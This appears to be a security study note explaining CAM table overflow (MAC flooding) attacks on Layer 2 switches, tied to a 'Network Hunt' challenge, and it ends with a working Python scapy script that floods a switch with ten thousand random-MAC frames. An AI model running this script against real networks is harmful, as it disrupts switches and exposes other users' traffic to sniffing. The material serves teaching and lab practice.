# CAM overflow/ MAC flooding attack

The hands-on for this is while solving the "Network Hunt" challenge.

## Background

- Content Addressable Memory (CAM) Table Overflow is a Layer 2 attack on a switch
- A switch’s CAM table contains network information such as MAC addresses available on physical switch ports and associated VLAN parameters.
- MAC address flooding attack (CAM table flooding attack) is a type of network attack where an attacker connected to a switch port floods the switch interface with very large number of Ethernet frames with different fake source MAC address.
- CAM Table Overflows occur when an influx of MAC addresses are flooded into the table and the CAM table threshold is reached. This causes the switch to act like a hub, flooding the network with traffic out all ports.

More about CAM over flow: [http://hakipedia.com/index.php/CAM_Table_Overflow](http://hakipedia.com/index.php/CAM_Table_Overflow)

- MAC address flooding exploits the memory and hardware limitations in a switch’s CAM table.
- Switchs are able to store numerous amounts of entries in the CAM table, however, once the resources are exhausted, the traffic is flooded out on all ports(or source VLAN), as the CAM table can no longer store MAC addresses, thus is no longer able to locate the MAC destination MAC address within a packet.
- An attacker is able to exploit this limitation by flooding the switch with an influx of (mostly invalid) MAC addresses, until the CAM tables resources are depleted. - When the aforementioned transpires, the switch has no choice but to flood all ports with all incoming traffic. This is due to the fact that it cannot find the switch port number for a corresponding MAC address within the CAM table. By definition, the switch, acts like, and becomes a hub.

## Exploitation

- CAM overflow attacks are very trivial and are very easy to lauch.
- Tools like macof(part of dsniff suite) make it even easier to exploit.
- To make the attacks reliable have an IP payload with random source and destination IP addresses.


```
#-------------------------------------------------------------------------------#
#     A script to perform CAM overflow attack on Layer 2 switches               #
#                   Bharath(github.com/0xbharath)                               #
#                                                                               #
#     CAM Table Overflow is flooding a switche's CAM table                      #
#     with a lot of fake entries to drive the switch into HUB mode.             #
#  (Send thousands of Ether packets with random MAC addresses in each packet)   #
#-------------------------------------------------------------------------------#

#!/usr/bin/env python
from scapy.all import Ether, IP, TCP, RandIP, RandMAC, sendp


'''Filling packet_list with ten thousand random Ethernet packets
   CAM overflow attacks need to be super fast.
   For that reason it's better to create a packet list before hand.
'''

def generate_packets():
    packet_list = []        #initializing packet_list to hold all the packets
    for i in xrange(1,10000):
        packet  = Ether(src = RandMAC(),dst= RandMAC())/IP(src=RandIP(),dst=RandIP())
        packet_list.append(packet)
    return packet_list

def cam_overflow(packet_list):
    sendp(packet_list, iface='tap0')

if __name__ == '__main__':
    packet_list = generate_packets()
    cam_overflow(packet_list)
```
